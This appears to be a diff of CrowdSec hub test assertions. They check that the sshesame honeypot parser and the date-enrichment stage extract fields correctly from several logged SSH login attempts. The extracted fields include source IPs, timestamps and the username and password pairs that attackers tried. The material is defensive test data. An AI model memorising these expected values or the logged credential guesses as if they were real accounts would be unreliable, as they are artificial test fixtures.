+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58912] authentication for user \"1\" with password \"1\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["sshesame_password"] == "1"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["sshesame_user"] == "1"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Parsed["timestamp"] == "2022/04/16 20:45:51"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["target_user"] == "1"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["timestamp"] == "2022-04-16T20:45:51Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Meta["username"] == "1"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][22].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:51Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["timestamp"] == "2022/04/16 20:45:52"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59100] authentication for user \"root\" with password \"root\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["sshesame_password"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Parsed["sshesame_user"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["target_user"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["timestamp"] == "2022-04-16T20:45:52Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["username"] == "root"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Meta["source_ip"] == "64.31.47.254"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][23].Evt.Enriched["MarshaledTime"] == "2022-04-16T20:45:52Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["message"] == "2022/04/16 22:00:01 [164.77.39.94:51670] authentication for user \"fangdan\" with password \"fangdan123\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["source_ip"] == "164.77.39.94"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["sshesame_password"] == "fangdan123"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["sshesame_user"] == "fangdan"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Parsed["timestamp"] == "2022/04/16 22:00:01"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["source_ip"] == "164.77.39.94"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["target_user"] == "fangdan"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["timestamp"] == "2022-04-16T22:00:01Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["username"] == "fangdan"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][24].Evt.Enriched["MarshaledTime"] == "2022-04-16T22:00:01Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Success == true
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["program"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["source_ip"] == "164.77.39.94"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["sshesame_password"] == "nproc"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["sshesame_user"] == "nproc"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["timestamp"] == "2022/04/16 22:00:03"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Parsed["message"] == "2022/04/16 22:00:03 [164.77.39.94:51964] authentication for user \"nproc\" with password \"nproc\" accepted"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["timestamp"] == "2022-04-16T22:00:03Z"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["username"] == "nproc"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["datasource_type"] == "file"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["log_type"] == "sshesame_login"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["service"] == "sshesame"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["source_ip"] == "164.77.39.94"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Meta["target_user"] == "nproc"
+results["s02-enrich"]["crowdsecurity/dateparse-enrich"][25].Evt.Enriched["MarshaledTime"] == "2022-04-16T22:00:03Z"
 len(results["success"][""]) == 0
